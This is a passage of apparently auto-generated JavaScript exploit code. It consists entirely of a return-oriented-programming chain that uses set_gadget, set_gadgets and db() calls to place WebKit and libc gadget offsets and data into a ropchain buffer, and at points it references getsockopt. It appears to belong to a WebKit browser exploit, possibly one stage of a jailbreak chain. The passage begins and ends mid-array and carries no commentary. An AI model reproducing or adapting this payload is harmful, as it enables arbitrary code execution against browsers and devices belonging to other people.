webkit_base+6227286, 
libc_base+793877, 
ropchain+174208, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+174256, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+174240, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+174368, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+174360, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+174384, 
ropchain+174832, 
libc_base+50775, 
libc_base+793877, 
ropchain+174456, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+174608, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+174640, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+174592, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+174624, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+174712, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+174728, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+174824, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+174808, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+174888, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+174976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+174992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+175144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+175128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+175160, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+175248, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175264, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+175384, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175400, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+175368, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+175496, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175512, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+175624, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175608, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+175712, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+175696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+175808, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175824, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+175936, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175920, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+177264, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+177336, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+177400, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+177544, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+177648, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([61, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+177848, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+177936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+177952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+178104, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+178136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+178088, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+178120, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+178232, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+178216, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+178336, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+180328, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+178472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+178488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+178456, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+178592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+178640, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+178624, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+178752, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+178744, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+178768, 
ropchain+179216, 
libc_base+50775, 
libc_base+793877, 
ropchain+178840, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+178992, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+178976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+179008, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+179096, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179112, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+179208, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+179192, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+179272, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+179360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+179376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+179528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+179512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+179544, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+179632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179648, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+179768, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+179752, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+179880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179896, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+180008, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179992, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+180096, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+180080, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+180192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+180208, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+180320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+180304, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+181648, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+181720, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+181784, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+181928, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+182032, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([61, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+182232, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+182320, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+182336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+182488, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+182520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+182472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+182504, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+182616, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+182600, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+182720, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+184712, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+182856, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+182872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+182840, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+182976, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+183024, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+183008, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+183136, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+183128, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+183152, 
ropchain+183600, 
libc_base+50775, 
libc_base+793877, 
ropchain+183224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+183376, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+183408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+183360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+183392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+183480, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+183496, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+183592, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+183576, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+183656, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+183744, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+183760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+183912, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+183944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+183896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+183928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
